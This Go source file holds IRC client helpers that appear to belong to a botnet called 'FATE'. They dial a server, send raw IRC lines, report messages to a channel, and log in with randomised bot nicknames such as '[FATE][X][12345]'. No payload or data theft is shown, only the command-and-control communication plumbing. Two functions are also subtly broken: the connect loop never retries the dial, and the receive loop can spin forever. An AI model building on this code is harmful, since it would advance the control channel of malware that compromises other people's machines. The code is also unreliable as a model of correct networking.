package pkg

import (
	"fmt"
	"math/rand"
	"net"
	"strings"
	"time"
)

func IRCconn(server string) net.Conn {
	conn, err := net.Dial("tcp", server)
	for err != nil {
		time.Sleep(10 * time.Second)
		continue
	}
	return conn
}

func IRCfind(read, msg string) bool {
	return strings.Contains(read, msg)
}

func IRCrecv(comd string, arg int) string {
	for {
		recv := strings.Split(comd, " ")
		if len(recv) == arg {
			continue
		}
		return recv[arg]
	}
}

func (irc *IRC) IRCsend(data string) {
	fmt.Fprintf(irc.Report, "%s\r\n", data)
}

func (irc *IRC) IRCreport(msg string) {
	irc.IRCsend("PRIVMSG " + irc.Channel + " " + " :" + msg)
}

func (irc *IRC) IRClogin() {
	rand.Seed(time.Now().UnixNano())
	alphabet := 'A' + rune(rand.Intn(26))
	sAlphabet := string(alphabet)
	botID := rand.Intn(100000000)

	user := fmt.Sprint("USER [FATE][", sAlphabet, "][", botID, "]", " 8 * :bot")
	nick := fmt.Sprint("NICK [FATE][", sAlphabet, "][", botID, "]")

	irc.IRCsend(user)
	irc.IRCsend(nick)
}
